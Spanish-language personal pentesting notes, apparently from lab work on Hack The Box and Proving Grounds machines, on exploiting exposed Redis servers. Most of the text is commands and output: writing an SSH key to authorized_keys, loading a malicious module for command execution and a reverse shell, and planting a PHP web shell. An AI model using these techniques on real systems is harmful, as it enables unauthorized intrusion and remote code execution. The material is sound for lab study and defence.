
## DESCRIPTION

ENUMERACION: LA CONTRASEÑA SUELE ESTAR /etc/redis/redis.conf

Si tenemos acceso a LFI podemos buscarla

Interesante para ver donde podemos escribir: /etc/apache2/sites-enabled/000-default.conf

POR DEFECTO EN /opt/redis-file


#### Mas información
* https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
*  https://0xdf.gitlab.io/2020/03/14/htb-postman.html https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis


## EXPLOITATION

Para conectar:

```
nc -vn 10.10.10.10 6379
# o
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```

### OPTION 1: WRITE SSH KEY

NECESTAMOS LOGIN (puede ser sin usuario si la app quiere)

VERSIÓN: 6379/tcp  open  redis   Redis key-value store 4.0.9

EXISTEN OTROS EXPLOITS: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis


EXPLICACIÓN: Dado que puedo escribir en redis, básicamente tengo escritura casi arbitraria en el sistema de archivos como el usuario redis se está ejecutando como escribiendo la base de datos a un archivo con el comando save. La razón por la que es "casi arbitraria" es porque no puedo escribir limpiamente un archivo, sino que puedo escribir mi contenido con basura a ambos lados. Pero hay muchos ataques basados en archivos en Linux que son robustos a la basura extra. Por ejemplo, escribir una clave SSH. sshd ignorará las líneas basura, y procesará las líneas que tengan una clave pública en el archivo authorized_keys.

![[Pasted image 20230607132642.png]]


PASO A PASO
1. Nos conectamos al redis: redis-cli -h 10.10.10.160
2. EN OTRA TERMINAL: generamos las claves → ssh-keygen -t rsa → le ponemos un nombre y la podemos dejar sin contraseñas

![[Pasted image 20230607132648.png]]
3. En la terminal anterior, tras la generación de claves ejecutamos → 
4
```
echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt 
```

5. En la primera terminal (del redis) ejcutamos:

```
config set dir /var/lib/redis/.ssh
config set dbfilename "authorized_keys"
save
```


![[Pasted image 20230607132703.png]]

5. Nos conectamos por ssh con la clave privada →
 ```
 ssh -i id_rsa redis@10.10.10.160
```


### OPTION 1: LOAD REDIS MODULE
Using https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#load-redis-module

```
# clone repo, make

# need to upload the module.so

# we can use ftp to upload

Uploaded module.so on ftp pub/

Default path is /var/ftp

Using redis-cli

192.168.224.93:6379> module load /var/ftp/pub/module.so

192.168.224.93:6379> modue list

(error) ERR unknown command `modue`, with args beginning with: `list`,

192.168.224.93:6379> module list

1) 1) "name"

2) "system"

3) "ver"

4) (integer) 1

192.168.224.93:6379> system.exec "whoami;id;hostname;uname -a"

"pablo\nuid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\nsybaris\nLinux sybaris 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n"

192.168.224.93:6379>

192.168.224.93:6379> system.exec "mkdir /home/pablo/.ssh"

192.168.224.93:6379> system.exec 'echo "ssh-rsa <<id_rsa.pub>> > /home/pablo/.ssh/authorized_keys'

[OR]

192.168.224.93:6379> system.rev IP PORT
```


### OPTION 3: WRITE WEB SHELL

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```


Si da error puede ser por que no tenemos permisos, si tenemos un LFI previamente conseguido entonces podemos ver en que directorios poemos escribir de redis y subir ahí la web shell para luego acceder con el LFI.

Por defecto en /opt/redis-file

```
192.168.220.166:6379> auth 'Ready4Redis?'
OK
192.168.220.166:6379> config set dir /opt/redis-files
OK
192.168.220.166:6379> config set dbfilename test.php
OK
192.168.220.166:6379> set test "<?php system($_GET['cmd']); ?>"
OK
192.168.220.166:6379> save
OK
192.168.220.166:6379> 

```

![[Pasted image 20230706144208.png]]
Ejemplo con wordpress LFI wordpress site editor 1.1.1

![[Pasted image 20230706144146.png]]


## MACHINES

* Hack The Box: 
* PG: Sybaris

**!!NOTA IMPORTANTE!!** 